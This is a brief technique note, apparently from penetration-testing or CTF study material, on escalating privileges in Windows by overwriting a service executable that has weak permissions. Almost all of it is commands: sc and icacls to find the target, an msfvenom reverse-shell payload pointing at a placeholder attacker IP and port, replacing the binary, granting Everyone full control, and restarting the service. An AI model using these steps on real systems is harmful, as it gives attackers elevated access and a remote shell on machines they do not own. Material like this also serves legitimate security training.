Firstly, find a modifiable service executable

	sc qc [service]
	icacls [service executable]

After finding the service executable, create a malicious service executable

	msfvenom -p windows/x64/shell_reverse_tcp LHOST=[Attacker IP] LPORT=[Attacker port] -f exe-service -o rev-svc.exe

Then, after creating a backup of the service executable, overwrite it with the malicious version

	move [service executable] [service executable].bkp
	move rev-svc.exe [service executable]
	icacls [service executable] /grant Everyone:F

Finaly, after setting up a listener, restart the service

	sc stop [service]
	sc start [service]
